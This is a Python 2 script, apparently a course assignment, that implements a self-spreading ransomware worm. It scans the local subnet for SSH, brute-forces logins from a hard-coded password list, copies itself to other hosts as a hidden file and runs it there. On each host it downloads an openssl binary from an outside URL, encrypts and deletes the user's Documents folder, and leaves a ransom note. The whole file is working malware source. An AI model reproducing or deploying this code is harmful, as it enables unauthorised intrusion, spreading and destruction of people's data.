#===============================================================================
# Script name:  extorter_worm.py
# Description:  A worm that contain an extorted payload which will compress and
#               encrypt the a folder and leave a ransom note on the infected
#               machine.
#===============================================================================

import paramiko     # To handle SSH and SFTP connection
import sys          # System
import socket       # Handle socket connection
import nmap         # Handle NMAP/port scanning
import os           # Operating system command
import netifaces    # Handle network interfaces
from subprocess import call # Allow running of another program
import urllib       # To handle file download
import tarfile      # Allow the creation of tar file
import shutil       # Allow to execute shell command

#===============================================================================
# Define a set of global variables and marker files
#===============================================================================
# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
('ubuntu', '123456'),
]

# Marker file to indicate whether the machine/system has been infected.
INFECTED_MARKER_FILE = "/tmp/.infected.txt"
# Marker file to indicate this is the attacker system
SELF_MARKER_FILE = "/tmp/.ilovecpsc456.txt"
# Retrieve the full path of the running worm
WORM_FILE = os.path.realpath(sys.argv[0])
# Define the new path for the destination of the worm
# Make the worm name a dot file so that it is somewhat hidden from view
WORM_NAME = os.path.basename(sys.argv[0])
if not WORM_NAME[0] == ".":
    WORM_NAME = "." + WORM_NAME

WORM_DEST = "/tmp/" + WORM_NAME

# Declare a variable to hold the full path to openssl
OPENSSL = "/tmp/openssl"

#===============================================================================
# Define a set of support functions use by the worm
#===============================================================================

#===============================================================================
# Function to check a local file whether a given file exists
# @param inFile - Input file path
# @return - True if exists or False if not
#===============================================================================
def isFileExist(inFile):
    if os.path.exists(inFile):
        return True
    else:
        return False

#===============================================================================
# Function to check whether a remote file exist on a given ssh connection
# @param sshClient - A handle of an open SSH session to the remote system
# @param inFile - A file path to be check on the remote system
# @return - True if file exist or False if not
#===============================================================================
def isRemoteFileExist(sshClient, inFile):
    exists = False
    try:
        # Create an SFTP session from the SSH connection
        sftp = sshClient.open_sftp()
        # Check the stat of the file
        sftp.stat(inFile)
        exists = True
    except IOError as e:
        exists = False

    return exists

#===============================================================================
# Function to check whether the local system has been infected
# This function is use to determine whether to perform any malicious action
# @return - True if infected or False if not
#===============================================================================
def isLocalSystemInfected():
    return (isFileExist(INFECTED_MARKER_FILE) or isFileExist(SELF_MARKER_FILE))

#===============================================================================
# Function to check whether the remote system has been infected
# This function is call to prevent re-spread of the worm
# @param sshClient - A handle of an open SSH session to the remote system
# @return - True if infected or False if not
#===============================================================================
def isRemoteSystemInfected(sshClient):
    return(isRemoteFileExist(sshClient, INFECTED_MARKER_FILE) or \
        isRemoteFileExist(sshClient, SELF_MARKER_FILE))

#===============================================================================
# Function to mark the system
# This function will get call to mark the system
# @return - N/A
#===============================================================================
def markSystem(inFile):
    try:
        fileObj = open(inFile, "w")
        fileObj.write("")
        fileObj.close()
    except IOError as e:
        print "markSystem function:"
        print "Error in markSystem function and file " + inFile
        sys.exit(1)

#===============================================================================
# Function to mark the system as infected
# @return - N/A
#===============================================================================
def markSystemAsInfected():
    markSystem(INFECTED_MARKER_FILE)
    print "System marked as infected"

#===============================================================================
# Function to mark the system as attacker/master
# @return - N/A
#===============================================================================
def markSystemAsMaster():
    markSystem(SELF_MARKER_FILE)
    print "System marked as master"

#===============================================================================
# Function to convert IPV4 Netmask to CIDR (Classless Interdomain Routing)
# @param ipAddr - The IP address such as 192.168.1.10
# @param netMask - The netmask such as 255.255.255.0
# @return - A string contain the CIDR format such as 192.168.1.0/24
#===============================================================================
def getCIDR(ipAddr, netMask):

    netMaskBin = ""
    netBit = 0
    CIDR = ""

    # Find out the network from the given IP Address and Net Mask
    # Extract the octet in pair then perform bitwise on them
    for ipOctet, maskOctet in zip(ipAddr.split("."), netMask.split(".")):
        # Perform bitwise and convert back to string
        CIDR += str(int(ipOctet) & int(maskOctet)) + "."
        # Compute the netMask into binary as well:
        netMaskBin += bin(int(maskOctet))[2:].zfill(8)

    # Convert to CIDR format
    netBit = len(netMaskBin.rstrip("0"))
    # Get rid of the last .
    CIDR = CIDR[:-1] + "/" + str(netBit)
    return CIDR

#===============================================================================
# Function to find out the current IP/NetMask of the host.
# @return - A tuple of IP and NetMask
#===============================================================================
def getMyActiveIP():

    myIP = ""
    myMask = ""

    # Use socket to connect to google DNS and see which IP interface is used.
    # Assumption is the the machine has access to internet
    try:
        mySocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        mySocket.connect(('8.8.8.8',0))
        myIP = mySocket.getsockname()[0]
        mySocket.close()
    except socket.error as e:
        myIP = ""

    # Retrieve the list of network interfaces on the system
    networkInterfaces = netifaces.interfaces()

    # Remove the loop back network so we won't have to deal with 127 address
    networkInterfaces.remove('lo')

    # Loop through the rest of the network interface to get the addr/mask
    for netFace in networkInterfaces:
        addr = netifaces.ifaddresses(netFace)[2][0]['addr']
        mask = netifaces.ifaddresses(netFace)[2][0]['netmask']

        if addr == myIP:
            myMask = mask
            break

    return myIP, myMask

#===============================================================================
# Function to find out all the hosts on the network exclude this system
# @parm CIDR - The string contain the classless interdomain routing format
# @return - A list of live hosts that we can attack
#===============================================================================
def getHostsOnTheSameNetwork(CIDR):
    # Create a NMAP to scan Port
    scanner = nmap.PortScanner()

    # Scan the CIDR for machine with port 22 open
    scanner.scan(CIDR, arguments = '-p 22 --open')
    allHosts = scanner.all_hosts()

    # To find out all actual live/up hosts
    upHosts = []

    for host in allHosts:
        if scanner[host].state() == "up":
            upHosts.append(host)

    return upHosts

#===============================================================================
# Function to attempt connect to a host with a given dictionary id/password
# @param host - The host system IP
# @param userName - The user name to try
# @param userPass - The password to try
# @param sshClient - A ssh client
# @return -  0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
#===============================================================================
def tryCredentials(host, userName, userPass, sshClient):

    try:
        sshClient.connect(host, username=userName, password=userPass)
        return 0
    except socket.error:
        return 3
    except paramiko.AuthenticationException:
        return 1

#===============================================================================
# Function to perform dictionary attack
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
#===============================================================================
def attackSystem(host):

    # The credential list
    global credList

    # Create an instance of the SSH client
    ssh = paramiko.SSHClient()

    # Set some parameters to make things easier.
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # The results of an attempt
    attemptResults = None

    # Go through the credentials
    for (username, password) in credList:
        # Call tryCredentials to see if we can connect to the system
        # with the given username and password from the dictionary
        attemptResults = tryCredentials(host, username, password, ssh)

        if attemptResults == 0:
            print "Credential found for host: " + host
            print "Credential: " + username + " and password: " + password
            return ssh, username, password
        elif attemptResults == 1:
            print "Wrong credential: " + username + " and password: " + password
            continue
        elif attemptResults == 3:
            print "Host: " + host + " is down or SSH is not running"
            return None

    # Could not find working credentials
    print "No credentials found for host " + host
    return None

#===============================================================================
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# @param fromHost - the system that it spread from
# to the victim system
#===============================================================================
def spreadAndExecute(sshClient, fromHost):
    cmdString = ""

    try:
        # Create a SFTP to spread the file
        sftpClient = sshClient.open_sftp()

        # Upload the worm file to the remote system
        sftpClient.put(WORM_FILE, WORM_DEST)

        # Change the permission of the file
        cmdString = "chmod +x " + WORM_DEST
        sshClient.exec_command(cmdString)

        # Tell the remote system to execute it
        cmdString = "nohup python " + WORM_DEST + " " + fromHost + " >/tmp/nohup.out 2>&1 &"
        sshClient.exec_command(cmdString)
        sshClient.close()

    except (IOError) as msg:
        print "spreadAndExecute function:"
        print "Error encountered while trying to spread"
        print msg

#===============================================================================
# Function to download openssl program from the net.
# @param None
# @return True if successfully download the file or False if failed
#===============================================================================
def downloadProgramFromNet():
    # Create a variable to hold the URL to the openssl program
    URL = "http://ecs.fullerton.edu/mgofman/openssl"
    try:
        # Download the URL above and save it to the path where OPENSSL defined
        urllib.urlretrieve(URL, OPENSSL)
        return True
    except (IOError, urllib.ContentTooShortError) as msg:
        print "downloadProgramFromNet function:"
        print msg
        return False

#===============================================================================
# Function to create a tar compression and Delete the original
# @param directory - The directory that we want to compress and Delete
#                    i.e: /home/cpsc/Documents/
# @return tarName if successfully created or None if not
#===============================================================================
def compressEncryptDelete(directory):

    tarName = ""

    if os.path.exists(directory):
        if not directory[-1] == "/":
            directory += "/"

        # Set a tar name to ~/<name>.tar
        tarName = os.path.expanduser("~") + "/" + directory.split("/")[-2] + ".tar"
    else:
        print "compressEncryptDelete function:"
        print "Path " + directory + " is not valid"
        return None

    # If we get here we will try to do things with the directory
    if not tarName == "":
        try:
            # First we create a tar and compress the directory
            # Open a tarfile for writing and gz compress
            tar = tarfile.open(tarName, "w:gz")
            # Add the directory to the archive
            tar.add(directory)
            # Close the tar file
            tar.close()

            # Then we encrypt it.  We need to change open ssl to execute
            call(["chmod", "a+x", OPENSSL])

            # Run the encryption
            password = "cs456worm"
            ARGS = [OPENSSL, "aes-256-cbc", "-a", "-salt", "-in", tarName, "-out"]
            ARGS.append(tarName + ".enc")
            ARGS.append("-k")
            ARGS.append(password)

            # Call the program to encrypt it
            call(ARGS)

            # Then we remove the directory
            shutil.rmtree(directory)

            # Finally we need to delete the tar file itself and only leave the
            # encrypted file
            os.remove(tarName)
            return tarName + ".enc"

        except OSError as msg:
            print "compressEncryptDelete function:"
            print msg
            return None
        except shutil.Error as msg:
            print "compressEncryptDelete function:"
            print msg
            return None
        except tarfile.TarError as msg:
            print "compressEncryptDelete function: " + tarName + ": "
            print msg
            return None

    else:
        print "compressEncryptDelete function:"
        print "Not able to get tarName: " + tarName
        return None

#===============================================================================
# Function to create a ransom note file
# @param tarName - The encrypted tarName path
# @return True if successfully leave a Ransom Note or False if not
#===============================================================================
def leaveRansomNote(tarName):
    ransomFile = os.path.expanduser("~") + "/Desktop/ransomNote.txt"
    try:
        fileObj = open(ransomFile, "w")
        fileObj.write("Your files had been pwned with encryption !")
        fileObj.write("To get it back, you will need to purchase the key from moi")
        fileObj.write("You must complete the following within 5 days !")
        fileObj.write("Record yourself saying 'I love CPSC 456' 100 times")
        fileObj.write("Attach the recorded file and email to getmykey@cpsc456.info")
        fileObj.write("Once verify you will get the key to decrypt the files")
        fileObj.write("Adios !")
        fileObj.close()
        return True
    except IOError as msg:
        print "leaveRansomNote function: " + msg
        return False

#===============================================================================
# Perform malicious action
# @param fromHost - Spread from Host
#===============================================================================
def performMalicious(fromHost):
    # Compress the user Documents directory
    docDir = os.path.expanduser("~") + "/Documents"
    encryptedFile = None
    # Mark the same thing as replicator worm
    try:
        outFile = open("/tmp/.attackedFrom.txt", "w")
        outFile.write("System was attacked from " + fromHost)
        outFile.close()
    except IOError as msg:
        print "performMalicious function:"
        print msg

    # Do the actual malicious acts
    if downloadProgramFromNet() and os.path.exists(OPENSSL):
        print "Successfully download openssl file"

        # Encrypt the directory
        encryptedFile = compressEncryptDelete(docDir)
        if encryptedFile == None:
            print "Something went wrong with extorting"
        elif leaveRansomNote(encryptedFile):
            print "Left a Message on Desktop"
        else:
            print "Something went wrong with leaving ransom note"

    else:
        print "Something went wrong getting openssl file"

#===============================================================================
# Main program start here
#===============================================================================
if __name__ == "__main__":

    # If the program run without an argument.  Then it's on a master
    if len(sys.argv) > 1:
        print "We are on the victim system"

        # If the system already infected, we exit
        if isLocalSystemInfected():
            sys.exit(0)
        else:
            # Otherwise we perform some malicious action
            fromHost = sys.argv[1]
            performMalicious(fromHost)

            # Then mark the system as infected
            markSystemAsInfected()
    else:
        # If we are running with another argument, then first
        # mark the system as master
        if not isLocalSystemInfected():
            markSystemAsMaster()


    # Perform scanning/attack/spread
    myIP = None
    myMask = None
    CIDR = None

    # First Get the current machine IP/Mask
    myIP, myMask = getMyActiveIP()

    # Get CIDR values
    CIDR = getCIDR(myIP, myMask)

    # Get all the hosts excluding this machine
    networkHosts = getHostsOnTheSameNetwork(CIDR)

    # Remove this system from the list
    networkHosts.remove(myIP)

    print "Found the following hosts on the system: "
    print networkHosts

    # Go through the network hosts
    for host in networkHosts:
        print ""
        print "Attacking host: " + host
        # Try to attack this host return a tuple
        sshInfo =  attackSystem(host)
        #print sshInfo

        # Did the attack succeed?
        if sshInfo:
            # Check if the remote system is already infected
            if isRemoteSystemInfected(sshInfo[0]):
                print "Host " + host + " is already infected skip."
                # Skip this one and continue to the next.
                continue
            else:
                print "Trying to spread to host " + host
                spreadAndExecute(sshInfo[0], myIP)
                print "Spread completed"

                # Since we want to do A to B, then B to C.  We stop
                # the moment that we are able to spread 1 time
                break

    # If we get here, terminate the program
    print "Done"
    sys.exit(0)
